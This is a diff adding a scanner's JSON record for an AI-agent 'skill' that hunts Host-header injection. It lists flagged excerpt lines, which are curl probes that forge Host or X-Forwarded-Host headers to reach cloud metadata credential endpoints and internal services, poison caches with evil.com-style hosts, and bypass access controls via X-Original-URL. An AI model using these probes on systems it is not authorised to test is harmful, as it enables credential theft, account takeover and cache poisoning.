@@ -1,0 +1,302 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-host-header",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-host-header",
+  "name": "hunt-host-header",
+  "description": "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "04545a4ddfac212ac7912614c041d13a31861f9f69e797e338d7519af23add07",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 81,
+        "excerpt": "# 1a. Override Host directly",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 82,
+        "excerpt": "curl -s -X POST https://$TARGET/forgot-password \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 88,
+        "excerpt": "curl -s -X POST https://$TARGET/forgot-password \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 94,
+        "excerpt": "curl -s -X POST https://$TARGET/forgot-password \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 104,
+        "excerpt": "curl -s -X POST https://$TARGET/forgot-password \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 108,
+        "excerpt": "curl -s -X POST https://$TARGET/forgot-password \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 127,
+        "excerpt": "# 2a. Is the host reflected into the body?",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 128,
+        "excerpt": "curl -s https://$TARGET/ \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 133,
+        "excerpt": "curl -sI \"https://$TARGET/?cb=$RANDOM\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 140,
+        "excerpt": "curl -s \"$URL\" -H \"X-Forwarded-Host: evilcdn.example\" >/dev/null   # poison",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 141,
+        "excerpt": "curl -s \"$URL\" | grep -i \"evilcdn.example\"                        # clean victim view → reflected = POISONED",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 162,
+        "excerpt": "# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 163,
+        "excerpt": "curl -s \"https://$TARGET/latest/meta-data/\" -H \"Host: 169.254.169.254\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 164,
+        "excerpt": "curl -s \"https://$TARGET/latest/meta-data/iam/security-credentials/\" -H \"Host: 169.254.169.254\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 167,
+        "excerpt": "curl -s \"https://$TARGET/computeMetadata/v1/\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 169,
+        "excerpt": "curl -s \"https://$TARGET/metadata/instance?api-version=2021-02-01\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 173,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"Host: localhost:6379\"   # Redis behind the proxy",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 174,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"Host: internal-admin.svc.cluster.local\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 178,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"Host: $COLLAB\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 186,
+        "excerpt": "# Reach an internal/blocked path the edge thought it denied. Real Host stays.",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 187,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"Host: $TARGET\" -H \"X-Original-URL: /admin\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 188,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"Host: $TARGET\" -H \"X-Rewrite-URL: /internal/metrics\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 198,
+        "excerpt": "# Does the authorization endpoint build redirect_uri / display URL from Host?",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 199,
+        "excerpt": "curl -s \"https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 203,
+        "excerpt": "curl -s \"https://$TARGET/.well-known/openid-configuration\" -H \"X-Forwarded-Host: evil.com\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-host-header/SKILL.md",
+        "line": 216,
+        "excerpt": "HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \\",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 6,
+      "network": 21
+    },
+    "score": 90,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 90,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
